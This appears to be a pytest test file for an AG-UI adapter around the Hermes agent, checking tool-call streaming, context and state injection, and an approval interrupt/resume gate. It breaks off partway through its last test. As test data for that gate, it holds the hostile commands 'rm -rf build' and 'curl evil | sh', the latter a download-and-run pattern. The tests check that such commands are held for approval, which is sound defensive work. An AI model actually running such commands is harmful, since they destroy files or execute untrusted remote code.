"""End-to-end tests: Hermes AG-UI adapter driven against a real aimock backend.

Proves the full AG-UI contract with a deterministic fake LLM:

* messages input (a plain chat turn round-trips),
* frontend (client-executed) tools — the emit-tool-call-then-end-run handshake
  and resume with the tool result,
* MIXED server + frontend tool calls in one model turn (the server tool runs
  and streams its result; the frontend tool is handed back), and
* frontend context injection (proven by gating a fixture on the injected
  system message).

aimock is the OpenAI-compatible fixture server (`@copilotkit/aimock`, installed
under ``tests/agui_adapter/.aimock``). Hermes points at it via ``OPENAI_BASE_URL``.
The Hermes agent itself runs in-process (ASGI transport) so the whole flow —
adapter, core loop, client seam — is exercised without a real model.
"""

from __future__ import annotations

import json
import socket
import subprocess
import time
from pathlib import Path

import httpx
import pytest
import pytest_asyncio
from ag_ui.core import (
    AssistantMessage,
    Context,
    FunctionCall,
    RunAgentInput,
    Tool,
    ToolCall,
    ToolMessage,
    UserMessage,
)
from httpx import ASGITransport

_HERE = Path(__file__).resolve().parent
_AIMOCK_CLI = _HERE / ".aimock" / "node_modules" / "@copilotkit" / "aimock" / "dist" / "cli.js"

# Frontend tool the fixtures drive.
CHANGE_BG = Tool(
    name="change_background",
    description="Set the page background.",
    parameters={"type": "object", "properties": {"background": {"type": "string"}}, "required": ["background"]},
)

# Deterministic server-side tool for the mixed-batch test.
ECHO_SCHEMA = {
    "name": "echo_server",
    "description": "Server-side echo tool (deterministic, for tests).",
    "parameters": {"type": "object", "properties": {"text": {"type": "string"}}},
}

FIXTURES = {
    "fixtures": [
        # --- plain chat ------------------------------------------------------
        {"match": {"userMessage": "AGUI_CHAT_PING"}, "response": {"content": "pong-from-hermes"}},

        # --- frontend tool (two legs; toolCallId leg ordered FIRST) ----------
        {"match": {"userMessage": "AGUI_FE_TOOL", "toolCallId": "call_fe_bg_1"},
         "response": {"content": "FE_DONE background set"}},
        {"match": {"userMessage": "AGUI_FE_TOOL"},
         "response": {"toolCalls": [{"id": "call_fe_bg_1", "name": "change_background",
                                     "arguments": {"background": "#123456"}}]}},

        # --- mixed server + frontend (two legs) ------------------------------
        {"match": {"userMessage": "AGUI_MIXED", "toolCallId": "call_fe_bg_2"},
         "response": {"content": "MIXED_DONE both ran"}},
        {"match": {"userMessage": "AGUI_MIXED"},
         "response": {"toolCalls": [
             {"id": "call_srv_1", "name": "echo_server", "arguments": {"text": "hi"}},
             {"id": "call_fe_bg_2", "name": "change_background", "arguments": {"background": "#654321"}},
         ]}},

        # --- server tool then narration (two legs) --------------------------
        # Leg 2 (tool result present): model narrates about the result. Ordered
        # FIRST so it wins once the echo_server result is in the request.
        {"match": {"userMessage": "AGUI_SRV_TOOL", "toolCallId": "call_srv_only"},
         "response": {"content": "The tool returned its answer."}},
        # Leg 1: model calls the server-executed echo_server tool.
        {"match": {"userMessage": "AGUI_SRV_TOOL"},
         "response": {"toolCalls": [{"id": "call_srv_only", "name": "echo_server",
                                     "arguments": {"text": "hi"}}]}},

        # --- context injection (gated on the injected system message) --------
        {"match": {"userMessage": "AGUI_CTX", "systemMessage": "Ada Lovelace"},
         "response": {"content": "CTX acknowledged Ada Lovelace"}},

        # --- forwarded_props (agent config) injection ------------------------
        {"match": {"userMessage": "AGUI_PROPS", "systemMessage": "tone: pirate"},
         "response": {"content": "PROPS acknowledged pirate"}},

        # --- inbound shared state injection ----------------------------------
        {"match": {"userMessage": "AGUI_STATE", "systemMessage": "Current shared state"},
         "response": {"content": "STATE acknowledged recipe"}},

        # --- state-writer tool: set_notes (two legs) -------------------------
        # Leg 2 (tool result present): model produces final text. Ordered
        # FIRST so it wins once the set_notes result is in the request.
        {"match": {"userMessage": "AGUI_SET_NOTES", "toolCallId": "call_notes_1"},
         "response": {"content": "NOTES saved"}},
        # Leg 1: model calls the server-executed state-writer tool.
        {"match": {"userMessage": "AGUI_SET_NOTES"},
         "response": {"toolCalls": [{"id": "call_notes_1", "name": "set_notes",
                                     "arguments": {"notes": ["likes tea", "prefers dark mode"]}}]}},
    ]
}

# forwarded_props declaring the set_notes state-writer tool (mirrors the
# shared_state_read_write demo: agent writes the `notes` key).
SET_NOTES_PROPS = {
    "stateWriterTools": [
        {
            "name": "set_notes",
            "stateKey": "notes",
            "arg": "notes",
            "description": "Replace the notes array in shared state.",
            "parameters": {"type": "object",
                           "properties": {"notes": {"type": "array", "items": {"type": "string"}}},
                           "required": ["notes"]},
        }
    ]
}


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _wait_port(port: int, timeout: float = 30.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return
        except OSError:
            time.sleep(0.2)
    raise RuntimeError(f"aimock did not start on port {port}")


@pytest.fixture(scope="module")
def _echo_tool():
    """Register a deterministic server-side tool for the mixed-batch test."""
    from tools.registry import registry

    registry.register(
        name="echo_server",
        toolset="agui-test",
        schema=ECHO_SCHEMA,
        handler=lambda args, **kw: "SERVER_OK",
        check_fn=lambda: True,
    )
    try:
        yield
    finally:
        # Deregister so this fixture does not leak "echo_server" into the
        # process-global registry for any later test that enumerates tools.
        registry.deregister("echo_server")


@pytest.fixture(scope="module")
def aimock(_echo_tool):
    if not _AIMOCK_CLI.exists():
        pytest.skip(f"aimock not installed at {_AIMOCK_CLI} (run npm i in tests/agui_adapter/.aimock)")
    fixtures_dir = _HERE / ".aimock" / "_fixtures_runtime"
    fixtures_dir.mkdir(parents=True, exist_ok=True)
    (fixtures_dir / "hermes.json").write_text(json.dumps(FIXTURES))

    port = _free_port()
    # Discard aimock's stdout rather than PIPE it: nothing reads proc.stdout,
    # so a PIPE could fill the OS pipe buffer and deadlock aimock mid-run.
    proc = subprocess.Popen(
        ["node", str(_AIMOCK_CLI), "-p", str(port), "-f", str(fixtures_dir)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        _wait_port(port)
        yield f"http://127.0.0.1:{port}/v1"
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


@pytest_asyncio.fixture
async def client(aimock):
    from agui_adapter.server import create_app
    from agui_adapter.session import AgentConfig

    # Set config fields directly rather than via env: the repo's autouse
    # conftest fixture scrubs OPENAI_* from the environment for every test.
    config = AgentConfig()
    config.base_url = aimock
    config.api_key = "sk-aimock"
    config.model = "gpt-4o"
    config.provider = "custom"  # Hermes' name for an OpenAI-compatible endpoint
    config.enabled_toolsets = ["agui-test"]

    app = create_app(config)
    transport = ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://127.0.0.1", timeout=60) as c:
        yield c


async def _run(client, run_input: RunAgentInput) -> list[dict]:
    """POST a run and collect the decoded AG-UI SSE events."""
    payload = run_input.model_dump(by_alias=True, mode="json")
    events: list[dict] = []
    async with client.stream("POST", "/", json=payload) as resp:
        assert resp.status_code == 200, resp.status_code
        async for line in resp.aiter_lines():
            if line.startswith("data:"):
                events.append(json.loads(line[len("data:"):].strip()))
    return events


def _types(events):
    return [e["type"] for e in events]


def _input(messages, *, tools=None, context=None, state=None, forwarded_props=None,
           thread="t1", run="r1") -> RunAgentInput:
    return RunAgentInput(
        thread_id=thread, run_id=run, state=state or {}, messages=messages,
        tools=tools or [], context=context or [], forwarded_props=forwarded_props or {},
    )


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_plain_chat_roundtrip(client):
    events = await _run(client, _input([UserMessage(id="u1", role="user", content="AGUI_CHAT_PING")]))
    assert _types(events)[0] == "RUN_STARTED"
    assert _types(events)[-1] == "RUN_FINISHED"
    text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
    assert "pong-from-hermes" in text


@pytest.mark.asyncio
async def test_frontend_tool_leg1_emits_call_and_ends(client):
    events = await _run(
        client,
        _input([UserMessage(id="u1", role="user", content="AGUI_FE_TOOL please")], tools=[CHANGE_BG]),
    )
    starts = [e for e in events if e["type"] == "TOOL_CALL_START"]
    assert len(starts) == 1
    assert starts[0]["toolCallName"] == "change_background"
    # The AG-UI tool_call_id MUST be the model-issued id (for resume correlation).
    assert starts[0]["toolCallId"] == "call_fe_bg_1"
    args = "".join(e["delta"] for e in events if e["type"] == "TOOL_CALL_ARGS")
    assert "background" in args
    # Frontend tool: NO result event is emitted by the server.
    assert not [e for e in events if e["type"] == "TOOL_CALL_RESULT"]
    assert _types(events)[-1] == "RUN_FINISHED"


@pytest.mark.asyncio
async def test_frontend_tool_resume_with_result(client):
    # Simulate the client having executed change_background and returning a result.
    messages = [
        UserMessage(id="u1", role="user", content="AGUI_FE_TOOL please"),
        AssistantMessage(id="a1", role="assistant", content="",
                         tool_calls=[ToolCall(id="call_fe_bg_1", type="function",
                                              function=FunctionCall(name="change_background", arguments='{"background":"#123456"}'))]),
        ToolMessage(id="tm1", role="tool", content='{"status":"success"}', tool_call_id="call_fe_bg_1"),
    ]
    events = await _run(client, _input(messages, tools=[CHANGE_BG]))
    text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
    assert "FE_DONE" in text


@pytest.mark.asyncio
async def test_mixed_server_and_frontend_tool_calls(client):
    """One model turn returns BOTH a server tool and a frontend tool.

    The server tool must execute (its result streamed) and the frontend tool
    must be handed back without a result.
    """
    events = await _run(
        client,
        _input([UserMessage(id="u1", role="user", content="AGUI_MIXED go")], tools=[CHANGE_BG]),
    )
    starts = {e["toolCallName"]: e for e in events if e["type"] == "TOOL_CALL_START"}
    assert "echo_server" in starts and "change_background" in starts

    # Server tool: has a result event carrying SERVER_OK.
    results = {e["toolCallId"]: e for e in events if e["type"] == "TOOL_CALL_RESULT"}
    srv_id = starts["echo_server"]["toolCallId"]
    fe_id = starts["change_background"]["toolCallId"]
    assert srv_id in results and "SERVER_OK" in results[srv_id]["content"]
    # Frontend tool: NO result (client will produce it), real model id preserved.
    assert fe_id == "call_fe_bg_2"
    assert fe_id not in results
    assert _types(events)[-1] == "RUN_FINISHED"


@pytest.mark.asyncio
async def test_mixed_resume_completes(client):
    messages = [
        UserMessage(id="u1", role="user", content="AGUI_MIXED go"),
        AssistantMessage(id="a1", role="assistant", content="",
                         tool_calls=[
                             ToolCall(id="call_srv_1", type="function", function=FunctionCall(name="echo_server", arguments='{"text":"hi"}')),
                             ToolCall(id="call_fe_bg_2", type="function", function=FunctionCall(name="change_background", arguments='{"background":"#654321"}')),
                         ]),
        ToolMessage(id="tm_srv", role="tool", content="SERVER_OK", tool_call_id="call_srv_1"),
        ToolMessage(id="tm_fe", role="tool", content='{"status":"success"}', tool_call_id="call_fe_bg_2"),
    ]
    events = await _run(client, _input(messages, tools=[CHANGE_BG]))
    text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
    assert "MIXED_DONE" in text


@pytest.mark.asyncio
async def test_server_tool_streams_live_before_narration(client):
    """A server tool call streams LIVE (via tool_progress/step) and its card
    lands BEFORE the model's follow-up narration — the north-star DOM order —
    while text still streams live (not buffered). Proves the proper
    tool-ordering fix: the server tool's TOOL_CALL_* / RESULT precede the final
    assistant text in the event stream."""
    events = await _run(
        client,
        _input([UserMessage(id="u1", role="user", content="AGUI_SRV_TOOL go")]),
    )
    types = _types(events)
    # Server tool card is present with its result.
    starts = {e["toolCallName"]: e for e in events if e["type"] == "TOOL_CALL_START"}
    assert "echo_server" in starts
    results = {e["toolCallId"]: e for e in events if e["type"] == "TOOL_CALL_RESULT"}
    srv_id = starts["echo_server"]["toolCallId"]
    assert srv_id in results and "SERVER_OK" in results[srv_id]["content"]

    # Ordering: the tool card (and its result) come BEFORE the follow-up
    # narration text, matching the north-star. The last assistant bubble is the
    # narration prose, not the tool card.
    last_result_idx = max(i for i, t in enumerate(types) if t == "TOOL_CALL_RESULT")
    narration_idxs = [i for i, t in enumerate(types) if t == "TEXT_MESSAGE_CONTENT"]
    # The follow-up narration is emitted after the tool result.
    assert any(i > last_result_idx for i in narration_idxs)
    text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
    assert "The tool returned its answer." in text


@pytest.mark.asyncio
async def test_frontend_context_injection(client):
    # The fixture only matches if the injected context (Ada Lovelace) reached
    # the model as a system message — proving context[] injection works.
    events = await _run(
        client,
        _input(
            [UserMessage(id="u1", role="user", content="AGUI_CTX who am i")],
            context=[Context(description="the user's display name", value="Ada Lovelace")],
        ),
    )
    text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
    assert "Ada Lovelace" in text


@pytest.mark.asyncio
async def test_forwarded_props_injection(client):
    # The fixture only matches if forwarded_props (rendered "tone: pirate")
    # reached the model as a system message — proving forwarded_props injection.
    events = await _run(
        client,
        _input(
            [UserMessage(id="u1", role="user", content="AGUI_PROPS talk to me")],
            forwarded_props={"tone": "pirate"},
        ),
    )
    text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
    assert "pirate" in text


@pytest.mark.asyncio
async def test_inbound_state_injection(client):
    # The fixture only matches if inbound state was injected as a
    # "Current shared state: ..." system message — proving state read works.
    events = await _run(
        client,
        _input(
            [UserMessage(id="u1", role="user", content="AGUI_STATE what am i cooking")],
            state={"recipe": {"title": "Pie"}},
        ),
    )
    text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
    assert "recipe" in text


@pytest.mark.asyncio
async def test_state_writer_tool_emits_snapshot(client):
    """A server-executed state-writer tool (set_notes) mutates shared state and
    the adapter emits a StateSnapshotEvent carrying the full merged state:
    inbound UI-set `preferences` PLUS the agent-written `notes`.

    The state-writer call is INTERNAL: its authoritative UI is the state card
    driven by the snapshot, so the adapter SUPPRESSES the visible TOOL_CALL_*
    chip for it (it would otherwise trail the streamed text as a raw chip) while
    still emitting the snapshot."""
    events = await _run(
        client,
        _input(
            [UserMessage(id="u1", role="user", content="AGUI_SET_NOTES remember this")],
            state={"preferences": {"tone": "casual"}},
            forwarded_props=SET_NOTES_PROPS,
        ),
    )
    types = _types(events)
    # The state-writer tool call is suppressed: no visible TOOL_CALL_* chip.
    starts = {e["toolCallName"]: e for e in events if e["type"] == "TOOL_CALL_START"}
    assert "set_notes" not in starts
    assert "TOOL_CALL_START" not in types
    assert "TOOL_CALL_RESULT" not in types

    # Exactly one snapshot, carrying seed + agent-written keys.
    snaps = [e for e in events if e["type"] == "STATE_SNAPSHOT"]
    assert len(snaps) == 1
    snapshot = snaps[0]["snapshot"]
    assert snapshot["preferences"] == {"tone": "casual"}
    assert snapshot["notes"] == ["likes tea", "prefers dark mode"]

    # The snapshot still lands, and the run finishes.
    assert types.index("STATE_SNAPSHOT") < types.index("RUN_FINISHED")
    assert types[-1] == "RUN_FINISHED"

    # Model produced its follow-up text after reading the tool result.
    text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
    assert "NOTES saved" in text


def test_error_closes_open_lifecycles_before_run_error(monkeypatch):
    """If the worker raises after opening a text lifecycle (streamed some
    assistant text via ``stream_delta_callback``), the bridge must close it
    (TEXT_MESSAGE_END) BEFORE the terminal RUN_ERROR — otherwise the client
    sees a message stuck perpetually "streaming". The reported error message
    must be controlled (no raw exception text leaked)."""
    import agui_adapter.server as server
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def run_conversation(self, user_message, conversation_history=None):
            self.stream_delta_callback("partial answer")
            raise RuntimeError("boom")

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "t-err", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "hi"}],
            "tools": [], "context": [], "forwardedProps": {}}

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r = client.post("/", json=body)
        assert r.status_code == 200
        assert "TEXT_MESSAGE_END" in r.text
        assert "RUN_ERROR" in r.text
        assert r.text.index("TEXT_MESSAGE_END") < r.text.index("RUN_ERROR")
        assert "boom" not in r.text


def test_fresh_run_rejected_while_approval_parked(monkeypatch):
    """A fresh (non-resume) run posted to a thread with a parked approval must
    be rejected with RUN_ERROR rather than racing/clobbering the parked run."""
    import agui_adapter.server as server
    from agui_adapter import approvals
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    # Fresh run 1 parks a worker on an approval that is never resolved via a
    # resume here. Use a LONG timeout so the parked entry is reliably present
    # when run 2's is_parked() check runs: a short timeout would race — if the
    # worker's timeout fired first it would discard the entry, run 2 would be
    # treated as a fresh run and re-park, and the RUN_ERROR assertion would flip
    # (see the CR finding on the prior 0.2s design). We unblock the worker
    # explicitly at the end instead of relying on the timeout firing in a window.
    monkeypatch.setattr(server, "_approval_timeout", lambda: 30.0)

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_):
            pass

        def run_conversation(self, user_message, conversation_history=None):
            from tools import terminal_tool
            cb = terminal_tool._get_approval_callback()
            decision = cb("rm -rf build", "deletes build dir") if cb else "deny"
            return {"final_response": f"decision={decision}", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "tp", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
            "tools": [], "context": [], "forwardedProps": {}}

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r1 = client.post("/", json=body)
        assert r1.status_code == 200
        assert '"type":"interrupt"' in r1.text.replace(" ", "")

        # A SECOND fresh run on the same thread (no resume) while the first
        # run's approval is still parked.
        body2 = {"threadId": "tp", "runId": "r2", "state": {},
                 "messages": [{"id": "m2", "role": "user", "content": "another message"}],
                 "tools": [], "context": [], "forwardedProps": {}}
        r2 = client.post("/", json=body2)
        assert r2.status_code == 200
        assert "RUN_ERROR" in r2.text
        assert "pending approval" in r2.text.lower()

        # Unblock run 1's still-parked worker EXPLICITLY (deny) so it finishes
        # (posts DONE) BEFORE the TestClient context exits and closes the event
        # loop — race-free, without relying on the timeout firing in a window.
        # Mirror what a resume does: take() pops the entry (so is_parked clears,
        # since the worker's finally deliberately does NOT discard on a normal
        # resolve), then resolve its future. Run 2 was rejected via is_parked()
        # and did NOT consume the entry, so it is still present here.
        parked = approvals.take("tp")
        assert parked is not None
        parked.pending.decision.set_result("deny")
        # Join the worker thread rather than polling is_parked, which flips
        # False at discard() BEFORE the worker posts its final events + DONE.
        import threading
        for _t in threading.enumerate():
            if _t.name == "hermes-agui-run":
                _t.join(timeout=2.0)
        assert not approvals.is_parked("tp")

    # Clear any residual parked entry (belt-and-suspenders; the join+assert
    # above should already have observed it cleared).
    approvals.take("tp")


def test_malformed_body_returns_400():
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r = client.post("/", content="not json", headers={"content-type": "application/json"})
        assert r.status_code == 400


def test_run_turn_sets_and_restores_interactive_context(monkeypatch):
    """`_run_turn` installs the approval context (interactive contextvar +
    thread-local approval callback) on the worker thread for the duration of
    the turn, and restores both afterward."""
    import agui_adapter.server as server

    seen = {}

    # Stub build_run_agent → a fake agent that records the live approval context.
    class _FakeAgent:
        def __init__(self):
            self.stream_delta_callback = None
            self.reasoning_callback = None
            self.tool_progress_callback = None
            self.step_callback = None
            self.thinking_callback = None

        def run_conversation(self, user_message, conversation_history=None):
            from tools.approval import _hermes_interactive_ctx
            from tools import terminal_tool

            seen["interactive"] = _hermes_interactive_ctx.get()
            seen["cb_set"] = terminal_tool._get_approval_callback() is not None
            return {"final_response": "", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    ri = RunAgentInput.model_validate({
        "threadId": "t1", "runId": "r1", "state": {},
        "messages": [{"id": "m1", "role": "user", "content": "hi"}], "tools": [],
        "context": [], "forwardedProps": {},
    })
    bridge = server.AGUIEventBridge(lambda e: None)
    server._run_turn(ri, server.AgentConfig(), bridge, {}, approval_cb=lambda *a, **k: "deny")

    assert seen["interactive"] == "1"  # set on the worker thread during the turn
    assert seen["cb_set"] is True
    # After the turn, the contextvar is reset.
    from tools.approval import _hermes_interactive_ctx
    assert _hermes_interactive_ctx.get() in (None, "")


def _first_interrupt_id(sse_text: str) -> str:
    import json
    for line in sse_text.splitlines():
        line = line.strip()
        if line.startswith("data:"):
            try:
                obj = json.loads(line[len("data:"):].strip())
            except Exception:
                continue
            outcome = obj.get("outcome")
            if isinstance(outcome, dict) and outcome.get("type") == "interrupt":
                return outcome["interrupts"][0]["id"]
    raise AssertionError("no interrupt id in SSE")


def test_interrupt_then_resume_runs_command_inline(monkeypatch):
    """Run 1 emits an interrupt outcome and parks; run 2 resumes and finishes."""
    import agui_adapter.server as server
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    # Fake agent whose run_conversation calls the installed approval callback
    # (simulating a dangerous command hitting the gate), then "runs" it.
    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_):
            pass

        def run_conversation(self, user_message, conversation_history=None):
            from tools import terminal_tool
            cb = terminal_tool._get_approval_callback()
            decision = cb("rm -rf build", "deletes build dir") if cb else "deny"
            return {"final_response": f"decision={decision}", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "t9", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
            "tools": [], "context": [], "forwardedProps": {}}

    # Use the context-manager form so both requests share ONE persistent event
    # loop (mirrors the single-uvicorn-worker invariant the parked queue relies
    # on; the queue is bound to the loop that created it in run 1).
    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        # Run 1: expect a RUN_FINISHED carrying an interrupt outcome, then end.
        r1 = client.post("/", json=body)
        assert r1.status_code == 200
        assert '"type":"interrupt"' in r1.text.replace(" ", "")
        # Extract interrupt id from the SSE payload.
        assert '"reason":"tool_call"' in r1.text.replace(" ", "")
        # The run-1 interrupt RUN_FINISHED must carry run 1's own id ("r1").
        assert '"runId":"r1"' in r1.text.replace(" ", "")

        # Run 2: resume approving once.
        body2 = {"threadId": "t9", "runId": "r2", "state": {},
                 "messages": body["messages"], "tools": [], "context": [],
                 "forwardedProps": {},
                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
        r2 = client.post("/", json=body2)
        assert r2.status_code == 200
        assert "decision=once" in r2.text  # the parked worker continued inline
        assert '"type":"success"' in r2.text.replace(" ", "")
        assert "RUN_ERROR" not in r2.text
        # Join the worker before the shared loop closes (consistency with the
        # other resume tests; the worker's last act is emit(DONE), already
        # drained above, so this is immediate).
        import threading as _thr
        for _t in _thr.enumerate():
            if _t.name == "hermes-agui-run":
                _t.join(timeout=2.0)


def test_interrupt_then_resume_deny_does_not_run_command(monkeypatch):
    """Explicit user-deny path: run 1 parks on an interrupt; run 2 resumes with
    approved=False → the parked worker receives 'deny' and finishes WITHOUT
    executing the command. (Timeout→deny is covered by
    test_timeout_denies_and_clears_registry; this is the common user-driven
    deny that the approve test's sibling was missing.)"""
    import agui_adapter.server as server
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    # Park timeout with comfortable margin: the resume lands in ~tens of ms, so
    # this is only a safety ceiling — large enough that a loaded runner can't
    # let the worker time out before run 2's take() (see the CR race finding).
    monkeypatch.setattr(server, "_approval_timeout", lambda: 5.0)

    ran = {"executed": False}

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_):
            pass

        def run_conversation(self, user_message, conversation_history=None):
            from tools import terminal_tool
            cb = terminal_tool._get_approval_callback()
            decision = cb("rm -rf build", "deletes build dir") if cb else "deny"
            if decision != "deny":
                # A real terminal tool would execute the command here; a denied
                # decision must never reach this branch.
                ran["executed"] = True
            return {"final_response": f"decision={decision}", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "t-deny", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
            "tools": [], "context": [], "forwardedProps": {}}

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r1 = client.post("/", json=body)
        assert r1.status_code == 200
        assert '"type":"interrupt"' in r1.text.replace(" ", "")

        body2 = {"threadId": "t-deny", "runId": "r2", "state": {},
                 "messages": body["messages"], "tools": [], "context": [],
                 "forwardedProps": {},
                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
                             "status": "resolved", "payload": {"approved": False}}]}
        r2 = client.post("/", json=body2)
        assert r2.status_code == 200
        assert "decision=deny" in r2.text  # worker unblocked with a deny
        assert ran["executed"] is False    # and never ran the command
        assert '"type":"success"' in r2.text.replace(" ", "")
        assert "RUN_ERROR" not in r2.text
        import threading as _thr
        for _t in _thr.enumerate():
            if _t.name == "hermes-agui-run":
                _t.join(timeout=2.0)


def test_interrupt_via_real_guard_dispatcher_end_to_end(monkeypatch):
    """End-to-end composition guard for the platform="agui" bug class.

    Drives a dangerous command through the REAL check_all_command_guards
    dispatcher (not a directly-invoked callback) inside _run_turn's ACTUAL
    installed bootstrap (interactive contextvar + set_session_vars with no
    platform, over the real HTTP worker), and asserts it reaches the
    PARK/interrupt path and resumes. If _run_turn regressed (a platform= or an
    inherited HERMES_GATEWAY_SESSION/HERMES_EXEC_ASK leaking is_gateway=True),
    the command would divert to the gateway submit_pending fallback and no
    interrupt would be emitted — this test would then fail at the run-1
    interrupt assertion. The other resume tests invoke the callback directly,
    so only this one exercises the dispatcher→callback seam end-to-end.

    It ALSO composes the env-neutralization guard: HERMES_GATEWAY_SESSION and
    HERMES_EXEC_ASK are set in the process before create_app(). If create_app's
    neutralize_interrupt_preempting_env() regressed, is_gateway/is_ask would be
    True, the command would divert to the gateway fallback, and the run-1
    interrupt assertion below would fail — so this single flow proves both the
    no-platform bootstrap AND the env-neutralization are load-bearing."""
    import agui_adapter.server as server
    from agui_adapter import approvals
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient
    from tools import approval, terminal_tool

    # Deterministic manual approval mode + park timeout with comfortable margin
    # (the resume lands in ~tens of ms; the timeout is only a safety ceiling).
    monkeypatch.setattr(approval, "_get_approval_mode", lambda: "manual")
    monkeypatch.setattr(server, "_approval_timeout", lambda: 5.0)
    # Inherited gateway/ask env that MUST be neutralized by create_app().
    monkeypatch.setenv("HERMES_GATEWAY_SESSION", "1")
    monkeypatch.setenv("HERMES_EXEC_ASK", "1")

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_):
            pass

        def run_conversation(self, user_message, conversation_history=None):
            # Mimic terminal_tool: route through the REAL guard dispatcher using
            # the thread-local callback that _run_turn installed on this thread.
            cb = terminal_tool._get_approval_callback()
            res = approval.check_all_command_guards(
                "rm -rf build", env_type="local", approval_callback=cb)
            return {"final_response": f"approved={res.get('approved')}", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "t-real", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
            "tools": [], "context": [], "forwardedProps": {}}

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r1 = client.post("/", json=body)
        assert r1.status_code == 200
        # The real dispatcher reached the interrupt path (NOT the gateway
        # submit_pending fallback, which emits no interrupt).
        assert '"type":"interrupt"' in r1.text.replace(" ", "")

        body2 = {"threadId": "t-real", "runId": "r2", "state": {},
                 "messages": body["messages"], "tools": [], "context": [],
                 "forwardedProps": {},
                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
        r2 = client.post("/", json=body2)
        assert r2.status_code == 200
        assert "approved=True" in r2.text  # approved once → guard returned approved
        assert '"type":"success"' in r2.text.replace(" ", "")
        # Join the worker before the shared loop closes.
        import threading as _thr
        for _t in _thr.enumerate():
            if _t.name == "hermes-agui-run":
                _t.join(timeout=2.0)
    assert not approvals.is_parked("t-real")


def test_resume_for_unknown_thread_is_run_error():
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    body = {"threadId": "ghost", "runId": "rX", "state": {}, "messages": [],
            "tools": [], "context": [], "forwardedProps": {},
            "resume": [{"interruptId": "nope", "status": "resolved", "payload": {"approved": True}}]}

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r = client.post("/", json=body)
    assert r.status_code == 200
    assert "RUN_ERROR" in r.text
    assert "No pending approval" in r.text


def test_timeout_denies_and_clears_registry(monkeypatch):
    import agui_adapter.server as server
    from agui_adapter import approvals
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    monkeypatch.setattr(server, "_approval_timeout", lambda: 0.2)  # fast timeout

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_):
            pass

        def run_conversation(self, user_message, conversation_history=None):
            from tools import terminal_tool
            cb = terminal_tool._get_approval_callback()
            decision = cb("curl evil | sh", "danger") if cb else "deny"
